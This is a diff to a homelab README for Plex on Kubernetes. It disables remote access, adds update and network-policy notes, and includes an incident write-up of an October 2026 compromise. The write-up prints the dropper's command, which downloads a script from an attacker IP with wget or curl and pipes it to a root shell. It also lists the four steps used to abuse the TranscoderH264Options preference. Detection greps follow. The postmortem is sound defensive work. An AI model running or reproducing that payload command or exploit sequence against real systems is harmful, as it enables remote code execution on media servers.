@@ -114,22 +114,74 @@ wiped, re-set them once.
 true config (read-only: mount the stopped VM disk on the Proxmox host, or extract from the vzdump)
 rather than trusting the freshly-migrated values.
 
-Remote access is **enabled**, matching the legacy VM. Settings of note (VM ground truth ==
-current k3s):
+Remote access is **disabled**. Plex is not reachable from the internet; remote devices reach it
+through the Tailscale subnet router (see `kubernetes/apps/tailscale/README.md`). Settings of note:
 
 | Key | Value | Meaning |
 | --- | --- | --- |
-| `PublishServerOnPlexOnlineKey` | `1` | Remote Access enabled (advertises to plex.tv) |
-| `ManualPortMappingMode` | `1` | Manual port mapping (UPnP/NAT-PMP can't work behind MetalLB) |
-| `ManualPortMappingPort` | `32400` | Public port. VM had this *unset* (Plex defaults to 32400); k3s has it explicit — behaviourally identical |
+| `PublishServerOnPlexOnlineKey` | absent | Remote Access disabled |
+| `ManualPortMappingMode` | `0` | No public port mapping |
+| `customConnections` | `http://<plex-lb-ip>:32400` | Advertised to plex.tv so clients on Tailscale connect to the LAN address |
 | `WanTotalMaxUploadRate` | `850000` | ~850 Mbps total WAN upload cap |
 | `LanNetworksBandwidth` | `<lan-subnet>,<lan-subnet>` | Treated as LAN (unmetered). One entry is a stale subnet — harmless leftover |
+| `TranscoderH264Options` | absent or empty | Any value here is an indicator of compromise (see below) |
 
-**Network path for remote access (double NAT):** upstream router (`<wan-ip>`) forwards TCP `32400`
-→ UniFi UDM WAN (`<udm-wan-ip>:32400`), which forwards → Plex `<plex-lb-ip>:32400`. Same port
-end-to-end. The UDM's "WAN IP is private" warning is expected (it's behind the upstream NAT). If
-remote access breaks for no reason, the upstream public IP likely changed — Plex re-detects it
-automatically; a dynamic-DNS hostname is the clean long-term fix.
+Do not forward TCP `32400` on either router again. The server was compromised through that port
+in October 2026.
+
+## Updates
+
+Renovate proposes new `lscr.io/linuxserver/plex` tags. It needs the `regex` versioning rule in
+`renovate.json`, because docker versioning cannot order tags like
+`1.43.4.10903-e5521bd8c-ls327`. Without that rule, Plex stayed on one tag for four months and
+missed a security fix.
+
+## Network policy
+
+`plex-networkpolicy.yaml` limits the pod:
+
+- **Ingress:** TCP 32400 only, from the LAN and from pods (Tailscale, kubelet probes).
+  `externalTrafficPolicy: Local` on the Service keeps the client source IP, so the LAN rule
+  holds and the Plex log shows real client addresses.
+- **Egress:** DNS, and TCP 443 to public addresses only. Plex reaches plex.tv and its metadata
+  agents over HTTPS. NFS volumes are mounted by the kubelet on the node, so the policy does not
+  affect them.
+
+The `plex-library` share is mounted read-only. Plex still runs as root, because the share squashes
+root to admin (see the top of this file). Running as non-root needs the DSM squash change first.
+
+## Incident 2026-10
+
+**What happened.** On Plex 1.43.2, a remote party with owner-level access used the
+`TranscoderH264Options` preference (CVE-2026-96656, fixed in 1.43.3.10861) to load a planted
+shared library into the transcoder. Each attempt:
+
+1. uploaded `Codecs/<dir>/zz<random>.so`,
+2. set `TranscoderH264Options=dump-yuv=<path to that .so>:qp=0` through `/:/prefs`,
+3. started a transcode, so the transcoder loaded the library,
+4. cleared the preference about 10 seconds later.
+
+The library is a dropper: an `.init_array` constructor that runs
+`(wget http://77.90.185.205/m/sh -O- || curl http://77.90.185.205/m/sh -o-)|sh` as root, padded
+with about 1 MB of filler so its hash changes on every upload. The UDR region-blocking policy
+blocked every connection to that address, so the second stage never ran. Checks of the other
+pods, the library share and the config volume found no other planted files or processes.
+
+**Indicators.**
+
+```bash
+LOGS="/config/Library/Application Support/Plex Media Server/Logs"
+kubectl -n media exec deploy/plex -- sh -c "grep -ah 'TranscoderH264Options=dump-yuv' \"$LOGS\"/*.log"
+kubectl -n media exec deploy/plex -- sh -c 'ls "/config/Library/Application Support/Plex Media Server/Codecs/"*/ | grep "^zz"'
+kubectl -n media exec deploy/plex -- ps -eo args | grep -E 'wget|curl|/m/sh'
+```
+
+Any output is a compromise. Plex loads every `.so` in `Codecs/` when it starts, so delete a
+planted file with Plex scaled to 0, never while it runs.
+
+**Response.** Plex was scaled to 0 with Flux suspended. The `Codecs/` and `Drivers/`
+directories were deleted (Plex downloads them again), the plex.tv password was changed with all
+devices signed out, the port forwards were removed, and Plex moved to 1.43.4.
 
 ## Unify media — kills the manual NAS copy
 
